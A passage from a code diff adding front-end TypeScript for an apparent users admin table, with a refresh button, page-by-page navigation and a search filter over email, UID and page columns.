+    const button = document.getElementById(
+      "refreshButton",
+    ) as HTMLButtonElement;
+    button.style.pointerEvents = "none";
+    window.showToast("Refreshing page...", "info");
+    setTimeout(() => {
+      window.location.reload();
+    }, 500);
+  });
+
+  const ITEMS_PER_PAGE = 10;
+  let currentPage = 1;
+  let filteredUsers = [...document.querySelectorAll("#usersTableBody tr")];
+
+  function updatePagination() {
+    const totalPages = Math.ceil(filteredUsers.length / ITEMS_PER_PAGE);
+    const prevButton = document.getElementById("prevPage") as HTMLButtonElement;
+    const nextButton = document.getElementById("nextPage") as HTMLButtonElement;
+    const pageButtons = document.querySelectorAll(".page-number");
+    const tableBody = document.getElementById("usersTableBody");
+
+    if (!prevButton || !nextButton || !tableBody) return;
+
+    prevButton.disabled = currentPage === 1;
+    nextButton.disabled = currentPage === totalPages;
+
+    pageButtons.forEach((button) => {
+      const pageNum = parseInt(button.getAttribute("data-page") || "1");
+      button.classList.toggle("active", pageNum === currentPage);
+      (button as HTMLElement).style.display =
+        pageNum <= totalPages ? "" : "none";
+    });
+
+    tableBody.setAttribute("data-current-page", currentPage.toString());
+  }
+
+  document.getElementById("prevPage")?.addEventListener("click", () => {
+    if (currentPage > 1) {
+      currentPage--;
+      updatePagination();
+    }
+  });
+
+  document.getElementById("nextPage")?.addEventListener("click", () => {
+    const totalPages = Math.ceil(filteredUsers.length / ITEMS_PER_PAGE);
+    if (currentPage < totalPages) {
+      currentPage++;
+      updatePagination();
+    }
+  });
+
+  document.querySelectorAll(".page-number").forEach((button) => {
+    button.addEventListener("click", () => {
+      const pageNum = parseInt(button.getAttribute("data-page") || "1");
+      if (pageNum !== currentPage) {
+        currentPage = pageNum;
+        updatePagination();
+      }
+    });
+  });
+
+  searchInput?.addEventListener("input", (e) => {
+    const searchTerm = (e.target as HTMLInputElement).value.toLowerCase();
+    filteredUsers = Array.from(
+      document.querySelectorAll("#usersTableBody tr"),
+    ).filter((row) => {
+      const email =
+        row.querySelector("td:nth-child(3)")?.textContent?.toLowerCase() || "";
+      const uid =
+        row.querySelector("td:nth-child(2)")?.textContent?.toLowerCase() || "";
+      const page =
+        row.querySelector("td:nth-child(4)")?.textContent?.toLowerCase() || "";
+      return (
+        email.includes(searchTerm) ||
+        uid.includes(searchTerm) ||
+        page.includes(searchTerm)
+      );
+    });
+
+    currentPage = 1;
+    updatePagination();
+
+    const userCount = document.getElementById("userCount");
+    if (userCount) {
+      userCount.textContent = filteredUsers.length.toString();
+    }
+  });
+
+  window.addEventListener("load", () => {
+    updatePagination();
+  });
+</script>
